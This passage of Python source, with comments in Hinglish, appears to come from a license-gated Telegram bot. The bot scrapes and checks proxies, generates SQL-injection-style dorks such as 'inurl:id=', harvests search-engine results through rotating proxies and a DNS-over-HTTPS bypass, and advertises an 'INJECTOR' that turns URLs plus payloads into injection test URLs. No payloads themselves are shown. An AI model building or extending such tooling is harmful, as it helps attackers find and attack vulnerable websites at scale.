        return False
    try:
        return all(0 <= int(x) <= 255 for x in p)
    except Exception:
        return False


def parse_proxies(text: str) -> list:
    """6 format: ip:port / ip port / ip,port / proto://ip:port / JSON data|proxies|results"""
    out = []
    t = text or ""
    st = t.strip()
    if st[:1] in "[{":
        try:
            j = json.loads(st)
            rows = []
            if isinstance(j, list):
                rows = j
            elif isinstance(j, dict):
                for key in ("data", "proxies", "results", "list", "proxy"):
                    if isinstance(j.get(key), list):
                        rows = j[key]
                        break
                else:
                    rows = [j]
            for r in rows:
                if not isinstance(r, dict):
                    continue
                ip = str(r.get("ip") or r.get("host") or r.get("ipAddress") or "").strip()
                port = r.get("port") or r.get("portNumber") or ""
                proto = str(r.get("protocols") or r.get("protocol") or r.get("type") or "http")
                if isinstance(proto, list):
                    proto = proto[0] if proto else "http"
                proto = "socks5" if "socks5" in str(proto).lower() else (
                    "socks4" if "socks4" in str(proto).lower() else (
                        "https" if "https" in str(proto).lower() else "http"))
                if ip and str(port).isdigit() and _valid_ip(ip):
                    out.append("%s://%s:%s" % (proto, ip, int(port)))
        except Exception:
            pass
    used = []   # proto URL ne jo span le liya, IP_PORT usko skip kare
    for m in PROTO_URL.finditer(t):
        proto = (m.group(1) or "http").lower()
        ip, port = m.group(2), int(m.group(3))
        if _valid_ip(ip) and 1 <= port <= 65535:
            out.append("%s://%s:%d" % (proto, ip, port))
            used.append((m.start(2), m.end(3)))
    for m in IP_PORT.finditer(t):
        s0, e0 = m.start(1), m.end(2)
        if any(s0 < ue and e0 > us for us, ue in used):
            continue
        ip, port = m.group(1), int(m.group(2))
        if _valid_ip(ip) and 1 <= port <= 65535:
            out.append("http://%s:%d" % (ip, port))
    return _uniq(out)


_DNS_CACHE = {}


async def doh_resolve(host: str, session=None) -> str:
    """DNS-over-HTTPS — DNS block ho to bhi IP mil jaye."""
    if host in _DNS_CACHE:
        return _DNS_CACHE[host]
    ip = ""
    for url, params in (("https://1.1.1.1/dns-query", {"name": host, "type": "A"}),
                        ("https://8.8.8.8/resolve", {"name": host, "type": "A"})):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, params=params, headers={"Accept": "application/dns-json"},
                                 timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
                    if r.status == 200:
                        j = await r.json(content_type=None)
                        for a in (j.get("Answer") or []):
                            cand = str(a.get("data") or "")
                            if _valid_ip(cand):
                                ip = cand
                                break
        except Exception:
            ip = ""
        if ip:
            break
    _DNS_CACHE[host] = ip
    return ip


async def fetch_source(session, kind: str, url: str, timeout: float = 12.0) -> tuple:
    """Ek source fetch → (url, proxies, raw_lines, ok). DoH fallback ke saath."""
    raw = ""
    for attempt in (1, 2):
        try:
            async with session.get(url, headers=UA, timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    raw = await r.text(errors="ignore")
                    break
        except Exception:
            raw = ""
        if attempt == 1:
            await asyncio.sleep(0.3)
    if not raw:
        try:
            u = url.split("/", 3)
            host = u[2]
            path = "/" + (u[3] if len(u) > 3 else "")
            ip = await doh_resolve(host)
            if ip:
                hdrs = dict(UA)
                hdrs["Host"] = host
                async with aiohttp.ClientSession() as s2:
                    async with s2.get("https://%s%s" % (ip, path), headers=hdrs,
                                      timeout=aiohttp.ClientTimeout(total=timeout),
                                      ssl=False, allow_redirects=True) as r2:
                        if r2.status == 200:
                            raw = await r2.text(errors="ignore")
        except Exception:
            raw = ""
    if not raw:
        return url, [], 0, False
    return url, parse_proxies(raw), len(raw.splitlines()), True


async def scrape_proxies(progress=None, force: bool = False, timeout: float = 12.0) -> list:
    """Saare sources parallel me — 45 sources, ek saath."""
    now = time.time()
    if not force and (now - _PROXY_CACHE["t"] < 120) and _PROXY_CACHE["data"]:
        return list(_PROXY_CACHE["data"])
    PSTATS.update({"sources_total": len(PROXY_SOURCES), "sources_ok": 0, "raw": 0, "hosts": []})
    found = []
    done = 0
    lock = asyncio.Lock()
    conn = aiohttp.TCPConnector(limit=100, limit_per_host=8, ssl=False, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as session:
        async def one(kind, url):
            nonlocal done
            u, px, lines, ok = await fetch_source(session, kind, url, timeout)
            async with lock:
                done += 1
                if ok:
                    PSTATS["sources_ok"] += 1
                    PSTATS["raw"] += lines
                    try:
                        h = url.split("/")[2]
                        if h not in PSTATS["hosts"]:
                            PSTATS["hosts"].append(h)
                    except Exception:
                        pass
                    found.extend(px)
                if progress and done % 5 == 0:
                    try:
                        await progress({"done": done, "total": len(PROXY_SOURCES),
                                        "ok": PSTATS["sources_ok"], "px": len(found)})
                    except Exception:
                        pass
        await asyncio.gather(*[one(k, u) for k, u in PROXY_SOURCES], return_exceptions=True)
    uniq = _uniq(found)
    _PROXY_CACHE.update({"t": time.time(), "data": uniq})
    return uniq


# ── very fast checker ────────────────────────────────────────────────────────
CHECK_TARGETS = [
    ("http://httpbin.org/ip", 5000),
    ("http://api.ipify.org?format=json", 5000),
    ("http://ifconfig.me/ip", 6000),
    ("http://ip-api.com/json", 6000),
]


async def check_one(session, proxy: str, sem: asyncio.Semaphore, timeout: float = 6.0):
    url, _t = CHECK_TARGETS[random.randrange(len(CHECK_TARGETS))]
    async with sem:
        t0 = time.perf_counter()
        try:
            async with session.get(url, proxy=proxy, headers=UA,
                                   timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    body = await r.text(errors="ignore")
                    if len(body) < 3000 and re.search(r"\d{1,3}(?:\.\d{1,3}){3}", body):
                        ms = int((time.perf_counter() - t0) * 1000)
                        return {"url": proxy, "ms": ms, "ok": True}
        except Exception:
            pass
    return {"url": proxy, "ok": False}


async def check_proxies(proxies: list, concurrency: int = 400, timeout: float = 6.0,
                        progress=None, want: int = 0) -> list:
    """High concurrency checker — phone pe bhi 400 parallel."""
    good = []
    sem = asyncio.Semaphore(max(20, min(1000, concurrency)))
    conn = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    total = len(proxies)
    done = 0
    lock = asyncio.Lock()
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for p in proxies:
            tasks.append(asyncio.create_task(check_one(session, p, sem, timeout)))
        for fut in asyncio.as_completed(tasks):
            res = await fut
            async with lock:
                done += 1
                if res.get("ok"):
                    good.append(res)
                if progress and done % 25 == 0:
                    try:
                        await progress({"done": done, "total": total, "alive": len(good)})
                    except Exception:
                        pass
            if want and len(good) >= want:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
    good.sort(key=lambda x: x.get("ms", 99999))
    return good


def save_proxy_pool(good: list) -> None:
    global PROXIES
    PROXIES = good
    jsave("proxies", {"at": datetime.now().isoformat(timespec="seconds"),
                      "list": [{"url": g["url"], "ms": g.get("ms", 0)} for g in good]})


def load_proxy_pool() -> list:
    global PROXIES
    if PROXIES:
        return PROXIES
    d = jload("proxies", {})
    PROXIES = [{"url": x["url"], "ms": x.get("ms", 0), "ok": True} for x in (d.get("list") or [])]
    return PROXIES


def manual_proxies() -> list:
    """data/manual_proxies.txt — 1 line = 1 proxy."""
    p = os.path.join(DATA_DIR, "manual_proxies.txt")
    if not os.path.exists(p):
        return []
    try:
        with open(p, encoding="utf-8", errors="ignore") as f:
            return parse_proxies(f.read())
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
#  PARSER — asli search engines, asli URLs
# ═══════════════════════════════════════════════════════════════════════════════
JUNK_HOSTS = {
    "duckduckgo.com", "google.com", "www.google.com", "bing.com", "www.bing.com",
    "yahoo.com", "search.yahoo.com", "mojeek.com", "www.mojeek.com", "brave.com",
    "search.brave.com", "startpage.com", "yandex.com", "yandex.ru", "baidu.com",
    "facebook.com", "twitter.com", "x.com", "instagram.com", "linkedin.com",
    "youtube.com", "pinterest.com", "tiktok.com", "reddit.com", "quora.com",
    "wikipedia.org", "amazon.com", "ebay.com", "w3.org", "schema.org",
    "github.com", "gitlab.com", "stackoverflow.com", "medium.com", "blogspot.com",
    "searx.be", "searxng.site", "priv.au", "search.bus-hit.me", "baresearch.org",
}
JUNK_EXT = {".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".ico", ".svg", ".png",
            ".jpg", ".jpeg", ".gif", ".webp", ".mp4", ".mp3", ".avi", ".map"}

ENGINE_URLS = {
    "ddg":     "https://html.duckduckgo.com/html/?q={q}",
    "bing":    "https://www.bing.com/search?q={q}&count=30&setlang=en",
    "mojeek":  "https://www.mojeek.com/search?q={q}",
    "yahoo":   "https://search.yahoo.com/search?p={q}&n=30",
    "brave":   "https://search.brave.com/search?q={q}",
    "startpage": "https://www.startpage.com/sp/search?query={q}",
    "google":  "https://www.google.com/search?q={q}&num=30&hl=en",
    "searx":   "https://searx.be/search?q={q}&format=json",
}
ENGINE_ORDER = ["ddg", "bing", "mojeek", "yahoo", "brave", "startpage", "searx", "google"]
ENGINE_MISS = {}      # engine -> consecutive empty/blocked count


def _clean_url(u: str) -> str:
    u = _html.unescape(u or "").strip().strip('"\'')
    if u.startswith("//"):
        u = "https:" + u
    if not u.startswith("http"):
        return ""
    try:
        p = urlparse(u)
        host = (p.hostname or "").lower()
        if not host:
            return ""
        base = ".".join(host.split(".")[-2:]) if host.count(".") >= 1 else host
        if host in JUNK_HOSTS or base in JUNK_HOSTS:
            return ""
        path = (p.path or "").lower()
        for e in JUNK_EXT:
            if path.endswith(e):
                return ""
        if len(u) > 500:
            return ""
        return "%s://%s%s%s" % (p.scheme or "http", host, p.path,
                                ("?" + p.query) if p.query else "")
    except Exception:
        return ""


def extract_urls(engine: str, body: str) -> list:
    """Engine ke HTML se result URLs nikaalo."""
    out = []
    if engine == "ddg":
        for m in re.finditer(r'uddg=([A-Za-z0-9%._~\-]+)', body):
            out.append(unquote(m.group(1)))
        for m in re.finditer(r'class="result__a"[^>]+href="([^"]+)"', body):
            out.append(_html.unescape(m.group(1)))
    elif engine == "bing":
        for m in re.finditer(r'<h2[^>]*>\s*<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'<cite[^>]*>(.*?)</cite>', body, re.S):
            out.append(re.sub(r"<[^>]+>", "", m.group(1)))
    elif engine == "mojeek":
        for m in re.finditer(r'<a[^>]+class="[^"]*\bob\b[^"]*"[^>]+href="([^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*class="[^"]*ob[^"]*"', body):
            out.append(m.group(1))
    elif engine in ("yahoo", "startpage", "brave", "google"):
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'/url\?q=(https?%3A[^&"]+)', body):
            out.append(unquote(m.group(1)))
    elif engine == "searx":
        try:
            j = json.loads(body)
            for r in (j.get("results") or []):
                out.append(str(r.get("url") or ""))
        except Exception:
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
                out.append(m.group(1))
    return _uniq([x for x in (_clean_url(u) for u in out) if x])


async def fetch_engine(session, engine: str, dork: str, proxy=None, timeout: float = 15.0) -> list:
    url = ENGINE_URLS.get(engine)
    if not url:
        return []
    target = url.format(q=quote_plus(dork))
    hdrs = dict(UA)
    hdrs["Referer"] = "https://www.google.com/"
    kw = {"headers": hdrs, "timeout": aiohttp.ClientTimeout(total=timeout),
          "ssl": False, "allow_redirects": True}
    if proxy:
        kw["proxy"] = proxy
    for attempt in (1, 2):
        try:
            async with session.get(target, **kw) as r:
                if r.status != 200:
                    if r.status in (403, 429, 503):
                        ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1
                    return []
                body = await r.text(errors="ignore")
                if not body:
                    return []
                urls = extract_urls(engine, body)
                if not urls:
                    ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1
                return urls
        except Exception:
            if attempt == 2:
                ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1
                return []
            await asyncio.sleep(0.15)


async def wayback_urls(domain: str, limit: int = 300, proxy=None) -> list:
    """Wayback CDX — captcha nahi, site: dork ke liye best."""
    url = ("http://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original"
           "&collapse=urlkey&limit=%d&filter=statuscode:200" % (quote_plus(domain), limit))
    try:
        kw = {"timeout": aiohttp.ClientTimeout(total=25), "ssl": False, "headers": UA}
        if proxy:
            kw["proxy"] = proxy
        async with aiohttp.ClientSession() as s:
            async with s.get(url, **kw) as r:
                if r.status != 200:
                    return []
                txt = await r.text(errors="ignore")
        rows = json.loads(txt)
        return _uniq([_clean_url(x[0]) for x in rows[1:] if x and _clean_url(x[0])])
    except Exception:
        return []


def _pick_proxy() -> str:
    pool = PROXIES or load_proxy_pool()
    if not pool:
        return None
    return random.choice(pool[: max(1, min(len(pool), 30))]).get("url")


async def parse(dorks: list, max_urls: int = 200, pages: int = 1, engines: list = None,
                use_proxy: bool = True, progress=None) -> dict:
    """Dork list → real URLs. Engine rotate + proxy rotate + 2 round retry."""
    engines = engines or ENGINE_ORDER
    max_urls = max(1, min(20000, int(max_urls or 200)))
    pages = max(1, min(20, int(pages or 1)))
    found = []
    seen = set()
    # chhoti dork list = zyada engines (depth), badi list = kam engines (speed)
    eng_cap = len(engines) if len(dorks) <= 10 else 3
    stats = {"queries": 0, "engine_hits": defaultdict(int), "errors": 0, "blocked": 0}
    conn = aiohttp.TCPConnector(limit=60, ssl=False, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=conn) as session:
        i = 0
        for dork in dorks:
            if len(found) >= max_urls:
                break
            for page in range(pages):
                if len(found) >= max_urls:
                    break
                q = dork if page == 0 else ("%s&start=%d" % (dork, page * 10))
                got = 0
                tried = 0
                order = list(engines)
                random.shuffle(order)
                # jo engine 3+ baar khaali/blocked nikla, use peeche bhejo
                order.sort(key=lambda e: ENGINE_MISS.get(e, 0) >= 3)
                for eng in order:
                    # 0-1 result pe kabhi give-up nahi — saare engines try karo
                    if tried >= eng_cap and got >= 2:
                        break
                    tried += 1
                    proxy = _pick_proxy() if use_proxy else None
                    urls = await fetch_engine(session, eng, q, proxy)
                    stats["queries"] += 1
                    if not urls:
                        stats["blocked"] += 1
                        continue
                    stats["engine_hits"][eng] += len(urls)
                    for u in urls:
                        k = u.split("#")[0]
                        if k not in seen:
                            seen.add(k)
                            found.append(k)
                            got += 1
                        if len(found) >= max_urls:
                            break
                    if got >= 5 or len(found) >= max_urls:
                        break
            i += 1
            if progress and i % 3 == 0:
                try:
                    await progress({"dorks": i, "total": len(dorks), "urls": len(found)})
                except Exception:
                    pass
    return {"urls": found, "stats": stats}


# ═══════════════════════════════════════════════════════════════════════════════
#  DUMPER — sab kuch file me
# ═══════════════════════════════════════════════════════════════════════════════
def dump_text(items, tag: str = "dump", header: str = "") -> tuple:
    """(path, count) — txt file banao."""
    items = [str(x) for x in (items or []) if str(x).strip()]
    name = "%s_%s.txt" % (re.sub(r"[^a-z0-9]+", "_", tag.lower())[:20] or "dump", stamp())
    path = os.path.join(DUMP_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        if header:
            f.write("# %s\n# %s\n\n" % (header, datetime.now().strftime("%d %b %Y %H:%M")))
        f.write("\n".join(items))
        f.write("\n")
    return path, len(items)


def dump_json(obj, tag: str = "dump") -> str:
    name = "%s_%s.json" % (re.sub(r"[^a-z0-9]+", "_", tag.lower())[:20] or "dump", stamp())
    path = os.path.join(DUMP_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, ensure_ascii=False, indent=1)
    return path


def dumps_list(limit: int = 12) -> list:
    try:
        files = [os.path.join(DUMP_DIR, f) for f in os.listdir(DUMP_DIR)]
        files = [f for f in files if os.path.isfile(f)]
        files.sort(key=os.path.getmtime, reverse=True)
        return files[:limit]
    except Exception:
        return []


async def send_file(update, path: str, caption: str = ""):
    try:
        with open(path, "rb") as f:
            await update.effective_message.reply_document(document=f,
                                                          filename=os.path.basename(path),
                                                          caption=caption[:1000])
        return True
    except Exception as exc:
        logger.warning("send_file fail: %s", exc)
        return False


# ═══════════════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════════════════════
def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 PARSER", callback_data="m:parse"),
         InlineKeyboardButton("🎯 DORKER", callback_data="m:dork")],
        [InlineKeyboardButton("🔑 HQ KEYWORDS", callback_data="m:kw"),
         InlineKeyboardButton("🔗 URL REVERSE", callback_data="m:rev")],
        [InlineKeyboardButton("💉 INJECTOR", callback_data="m:inj"),
         InlineKeyboardButton("📦 DUMPER", callback_data="m:dump")],
        [InlineKeyboardButton("🧅 PROXY ENGINE", callback_data="m:proxy"),
         InlineKeyboardButton("📊 QUALITY CHECK", callback_data="m:qa")],
        [InlineKeyboardButton("🎲 RANDOMIZER", callback_data="m:rand"),
         InlineKeyboardButton("📖 HELP", callback_data="m:help")],
    ])


def kb_back(to: str = "m:home") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data=to)]])


def main_text(name: str = "") -> str:
    c = db_counts()
    hi = "Hi <b>%s</b>,\n" % esc(name) if name else ""
    return (H("PYTHON SNAKE", "CORE %s • sirf kaam ka" % VERSION) + "\n"
            + hi + "\n"
            "📦 <b>Database</b>\n"
            "• Page-types : <code>%s</code>\n"
            "• Parameters : <code>%s</code>\n"
            "• Extensions : <code>%s</code>\n"
            "• Dorks      : <code>%s</code>\n"
            "• Keywords   : <code>%s</code>\n\n"
            "👇 Tool chuno"
            % (fmt(c["page_types"]), fmt(c["parameters"]), fmt(c["extensions"]),
               fmt(c["dorks"]), fmt(c["keywords"])))


# ═══════════════════════════════════════════════════════════════════════════════
#  ACCESS / CAPTCHA
# ═══════════════════════════════════════════════════════════════════════════════
def captcha_new(context):
    a, b = random.randint(2, 19), random.randint(2, 19)
    op = random.choice(["+", "-", "×"])
    ans = a + b if op == "+" else (a - b if op == "-" else a * b)
    opts = {ans}
    while len(opts) < 4:
        d = ans + random.choice((-6, -4, -3, -2, -1, 1, 2, 3, 4, 6))
        if d > 0:
            opts.add(d)
    opts = sorted(opts)
    random.shuffle(opts)
    try:
        context.user_data["cap"] = ans
    except Exception:
        pass
    q = (H("VERIFICATION") + "\n\nBot use karne se pehle ye solve karo:\n\n"
         "<b>%d %s %d = ?</b>" % (a, op, b))
    rows = [[InlineKeyboardButton(str(o), callback_data="cap:%d" % o) for o in opts[:2]],
            [InlineKeyboardButton(str(o), callback_data="cap:%d" % o) for o in opts[2:]]]
    rows.append([InlineKeyboardButton("🔄 Naya sawaal", callback_data="cap:new")])
    return q, InlineKeyboardMarkup(rows)


def access_ok(uid) -> bool:
    return is_admin(uid) or has_access(uid)


def need_key_text(uid) -> str:
    return (H("ACCESS NEEDED", "license nahi hai") + "\n\n"
            "Aapki ID: <code>%s</code>\n\n"
            "🔑 <b>REDEEM KEY</b> dabao aur key daalo.\n"
            "Ya owner se key lo: %s"
            % (uid, ADMIN_USERNAME))


def kb_needkey() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="m:redeem")],
        [InlineKeyboardButton("☎️ CONTACT OWNER", url="https://t.me/%s" % ADMIN_USERNAME.lstrip("@"))],
    ])


async def show_home(update, uid, edit: bool = True):
    touch_user(update) if update.effective_user else None
    txt = main_text(getattr(update.effective_user, "first_name", "") or "")
    if not access_ok(uid):
        try:
            if edit and update.callback_query:
                await update.callback_query.edit_message_text(need_key_text(uid),
                                                              reply_markup=kb_needkey())
            else:
                await update.effective_message.reply_text(need_key_text(uid),
                                                          reply_markup=kb_needkey())
        except Exception:
            pass
        return
    try:
        if edit and update.callback_query:
            await update.callback_query.edit_message_text(txt, reply_markup=kb_main(),
                                                          parse_mode=ParseMode.HTML)
        else:
            await update.effective_message.reply_text(txt, reply_markup=kb_main(),
                                                      parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    touch_user(update)
    if not context.user_data.get("verified"):
        q, kb = captcha_new(context)
        await update.effective_message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    await show_home(update, u.id, edit=False)


async def cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    uid = u.id
    adm = "👑 Admin (unlimited)" if is_admin(uid) else (
        "✅ Licensed" if has_access(uid) else "⚪ No license — 🔑 REDEEM KEY dabao")
    txt = ("🪪 <b>YOUR ID</b>\n" + "─" * 26 + "\n"
           "ID       : <code>%d</code>\n"
           "Username : %s\n"
           "Status   : %s" % (uid, esc("@" + u.username if u.username else (u.first_name or "—")), adm))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(help_text(), parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:home"))


def help_text() -> str:
    return (H("HELP", "kaun sa tool kya karta hai") + "\n\n"
            "🔍 <b>PARSER</b> — dork do, asli search engines (DDG/Bing/Mojeek/Yahoo/"
            "Brave/Startpage/Google) se <b>real URLs</b> nikaalta hai. Proxy rotate hota hai.\n\n"
            "🎯 <b>DORKER</b> — page-type / extension / parameter / mixed dork banata hai, "
            "quality score ke saath.\n\n"
            "🔑 <b>HQ KEYWORDS</b> — seed topic do, high-quality keyword list milti hai "
            "(scored, filtered).\n\n"
            "🔗 <b>URL REVERSE</b> — URL paste karo → domain, path, extension, parameters "
            "nikalte hain + usse banaye ja sakne wale dorks.\n\n"
            "💉 <b>INJECTOR</b> — URLs + payload → injection test URLs.\n\n"
            "📦 <b>DUMPER</b> — pichhli saari files download karo.\n\n"
            "🧅 <b>PROXY</b> — 45 sources scrape + super-fast check.\n\n"
            "📊 <b>QUALITY</b> — dork/keyword ko 0-100 score + wajah.\n\n"
            "🎲 <b>RANDOMIZER</b> — dorks ko shuffle + operator mutate.\n\n"
            "👑 Admin: <code>/admin</code> — panel sirf admins ko.")


# ═══════════════════════════════════════════════════════════════════════════════
#  CALLBACK ROUTER
# ═══════════════════════════════════════════════════════════════════════════════
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = update.effective_user.id
    data = q.data or ""
    try:
        await q.answer()
    except Exception:
        pass

    # ── captcha ──
    if data.startswith("cap:"):
        val = data.split(":", 1)[1]
        if val == "new":
            text, kb = captcha_new(context)
            try:
                await q.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            ok = int(val) == int(context.user_data.get("cap", -999))
        except Exception:
            ok = False
        if ok:
            context.user_data["verified"] = True
            await show_home(update, uid)
        else:
            text, kb = captcha_new(context)
            try:
                await q.edit_message_text("❌ Galat! Dobara try karo.\n\n" + text,
                                          reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return

    # ── admin ──
    if data.startswith("a:"):
        return await admin_callback(update, context, data[2:])

    # ── menu ──
    if not data.startswith("m:"):
        return
    tool = data[2:]
    if tool == "home":
        return await show_home(update, uid)
    if not access_ok(uid):
        try:
            await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if tool == "help":
        try:
            await q.edit_message_text(help_text(), reply_markup=kb_back("m:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if tool == "qual_done":
        return

    handler = TOOL_HANDLERS.get(tool)
    if handler:
        try:
            await handler(update, context)
        except Exception as exc:
            logger.exception("tool %s fail: %s", tool, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: DORKER
# ═══════════════════════════════════════════════════════════════════════════════
DORK_MODES = {
    "page":  ("📄 PAGE-TYPES", "inurl:product.php, shop/item.php …"),
    "ext":   ("🗂 EXTENSIONS", "filetype:php, filetype:sql …"),
    "param": ("🔧 PARAMETERS", "inurl:id=, inurl:page= …"),
    "mixed": ("🎲 MIXED (HQ)", "saare templates random"),
    "niche": ("🎯 NICHE", "niche ke hisaab se"),
}


async def tool_dork(update, context):
    q = update.callback_query
    rows = [[InlineKeyboardButton(label, callback_data="dd:mode:" + k)]
            for k, (label, _d) in DORK_MODES.items()]
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    txt = (H("DORKER", "type chuno") + "\n\n" +
           "\n".join("%s — <i>%s</i>" % (label, desc) for label, desc in DORK_MODES.values()) +
           "\n\n<b>Count</b> agla step me poochhunga (1-5000).")
    try:
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(rows),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_dork_mode(update, context, mode: str):
    q = update.callback_query
    context.user_data["dork_mode"] = mode
    label = DORK_MODES.get(mode, ("?", ""))[0]
    txt = (H("DORKER — %s" % label) + "\n\n"
           "Kitne dork chahiye? <b>Number bhejo</b> (1-5000)\n"
           "<i>Recommended: 50</i>")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back("m:dork"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "dork_count"


async def input_dork_count(update, context, text: str):
    try:
        n = int(re.sub(r"[^0-9]", "", text) or "50")
    except Exception:
        n = 50
    n = max(1, min(5000, n))
    mode = context.user_data.get("dork_mode", "mixed")
    msg = await update.effective_message.reply_text("⏳ %d dorks ban rahe hain…" % n)
    t0 = time.time()
    dorks = make_dork(mode, n=n)
    context.user_data["last_dorks"] = dorks
    took = time.time() - t0
    scores = [score_dork(d)[0] for d in dorks]
    avg = sum(scores) / len(scores) if scores else 0
    path, cnt = dump_text(dorks, "dorks_" + mode, "PYTHON SNAKE — %s dorks" % mode)
    top = short_list(dorks[:10], 10)
    txt = (H("DORKER — DONE", "%s mode" % mode) + "\n\n"
           "✅ Bane      : <code>%s</code>\n"
           "⭐ Avg score : <code>%.0f/100</code>\n"
           "⏱ Time      : <code>%.2fs</code>\n\n"
           "<b>Top 10:</b>\n%s" % (fmt(cnt), avg, took, top))
    try:
        await msg.delete()
    except Exception:
        pass
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:dork"))
    await send_file(update, path, "🎯 %d dorks • avg %.0f/100" % (cnt, avg))
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: HQ KEYWORDS
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_kw(update, context):
    q = update.callback_query
    txt = (H("HQ KEYWORD GENERATOR") + "\n\n"
           "Seed topic(s) bhejo — comma se alag kar sakte ho:\n\n"
           "<code>shopify store, crypto wallet, apk download</code>\n\n"
           "<i>Jitne seed, utni zyada keywords.</i>")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "kw_seeds"


async def input_kw_seeds(update, context, text: str):
    seeds = text.strip()
    if len(seeds) < 2:
        await update.effective_message.reply_text("❌ Seed chhota hai. Dobara bhejo.")
        return
    msg = await update.effective_message.reply_text("⏳ Keywords generate ho rahe hain…")
    t0 = time.time()
    kws = make_keywords(seeds, n=200)
    took = time.time() - t0
    if not kws:
        await msg.edit_text("❌ Kuch nahi bana — seed check karo.")
        return
    scores = [score_keyword(k)[0] for k in kws]
    avg = sum(scores) / len(scores)
    path, cnt = dump_text(kws, "keywords", "PYTHON SNAKE — HQ keywords (%s)" % seeds[:60])
    context.user_data["last_kws"] = kws
    txt = (H("HQ KEYWORDS — DONE") + "\n\n"
           "🌱 Seeds   : <code>%s</code>\n"
           "✅ Bane    : <code>%s</code>\n"
           "⭐ Avg     : <code>%.0f/100</code>\n"
           "🔥 80+     : <code>%d</code>\n"
           "⏱ Time    : <code>%.2fs</code>\n\n"
           "<b>Top 10:</b>\n%s"
           % (esc(seeds[:80]), fmt(cnt), avg, sum(1 for s in scores if s >= 80), took,
              short_list(kws[:10], 10)))
    try:
        await msg.delete()
    except Exception:
        pass
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:kw"))
    await send_file(update, path, "🔑 %d keywords" % cnt)
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: URL REVERSE
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_rev(update, context):
    q = update.callback_query
    txt = (H("URL REVERSE") + "\n\n"
           "URL(s) paste karo — ek line me ek:\n\n"
           "<code>https://shop.example.com/product.php?id=12&cat=5</code>\n\n"
           "Main domain, path, extension, parameters nikaal ke dorks bana dunga.")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "rev_urls"


async def input_rev_urls(update, context, text: str):
    urls = [x.strip() for x in re.split(r"[\s,]+", text) if x.strip()][:20]
    infos = [url_reverse(u) for u in urls]
    infos = [i for i in infos if i]
    if not infos:
        await update.effective_message.reply_text("❌ Koi valid URL nahi mila.")
        return
    lines = []
    all_dorks = []
    for i in infos:
        d = url_reverse_dorks(i, n=12)
        all_dorks += d
        lines.append("<b>%s</b>\n• host : <code>%s</code>\n• file : <code>%s</code>\n"
                     "• ext  : <code>%s</code>\n• params: <code>%s</code>\n• dorks: <code>%d</code>"
